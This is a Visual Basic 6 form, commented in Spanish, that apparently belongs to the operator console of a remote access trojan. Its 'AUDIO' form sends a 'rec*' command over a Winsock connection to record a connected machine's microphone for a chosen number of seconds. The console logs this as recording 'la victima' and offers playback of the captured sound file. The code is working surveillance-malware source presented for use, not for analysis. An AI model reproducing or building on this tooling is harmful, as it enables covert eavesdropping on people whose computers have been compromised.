VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Object = "{F8180939-60A2-4494-B1BB-04818D7F640B}#1.0#0"; "LabelDegradado.ocx"
Begin VB.Form AUDIO 
   BorderStyle     =   5  'Sizable ToolWindow
   Caption         =   "AUDIO"
   ClientHeight    =   900
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   3525
   LinkTopic       =   "Form5"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   900
   ScaleWidth      =   3525
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin LabelDegradado.LabelDegrade LabelDegrade1 
      Height          =   255
      Left            =   1200
      TabIndex        =   3
      Top             =   120
      Width           =   2175
      _ExtentX        =   3836
      _ExtentY        =   450
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "&Segundos - Presione enter."
      BackColor       =   255
      Transparente    =   0   'False
      ShadowDepth     =   0
      ShadowStyle     =   0
      ShadowColorStart=   0
      DegradadoColorStart=   8388608
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   960
      OleObjectBlob   =   "AUDIO.frx":0000
      Top             =   360
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Cerrar"
      Height          =   315
      Left            =   1800
      TabIndex        =   2
      Top             =   480
      Width           =   1575
   End
   Begin VB.CommandButton Repro 
      Caption         =   "&Reproducir anterior"
      Height          =   315
      Left            =   120
      TabIndex        =   1
      Top             =   480
      Width           =   1575
   End
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   840
      Top             =   0
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   855
   End
End
Attribute VB_Name = "AUDIO"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long
Private Declare Function PathFileExists Lib "shlwapi" Alias "PathFileExistsA" (ByVal lppath As String) As Boolean
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal _
    lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As _
        Long, ByVal hwndCallback As Long) As Long
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpszExistingFileName As String) As Boolean
Private Declare Function ShellExecute Lib "shell32" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpCommand As String, ByVal path As String, ByVal lpreturns As String, ByVal show As Long) As Long

Dim vIndex As Variant

Dim Index_n As Integer

Private Sub Command1_Click()
Unload Me
End Sub

Private Sub Form_Load()
Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")

'Skin1.LoadSkin App.path & "\sk\skin5.skn"
'Skin1.ApplySkin AUDIO.hwnd
End Sub

Private Sub Repro_Click()

If PathFileExists(App.path & "\sonido.wav") Then
    mciSendString "play sonido.wav", 0, 0, 0
Else
    lista.List1.ListItems.Add , , "[ERROR NO SE HA ENCONTRADO EL ARCHIVO]"
End If

End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer)

If KeyAscii = 13 Then

    If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    
        Form1.Winsock1(vIndex(0)).SendData "rec*" & Val(Text1.Text) * 1000
        lista.List1.ListItems.Add , , "[ GRABANDO AUDIO DE LA VICTIMA POR " & Text1.Text & " SEGUNDOS NO PRESIONE MAS COMANDOS O TECLAS POR FAVOR ]"
        
        If PathFileExists(App.path & "\sonido.wav") Then
        
            DeleteFile App.path & "\sonido.wav"
        End If
        
        Unload Me
        
    Else
        retro = True
        lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
        Unload Me
    End If
    
End If

End Sub

Private Sub Timer1_Timer()

If Form1.Winsock1(vIndex(0)).state = sckError Then
    Unload Form2
    Unload Me
End If

If Not IsNumeric(Text1.Text) Then
    Text1.Text = ""
    Text1.SetFocus
End If

If Text1.Text = "" Or Text1.Text = "0" Then
    Text1.Text = 2
End If

End Sub
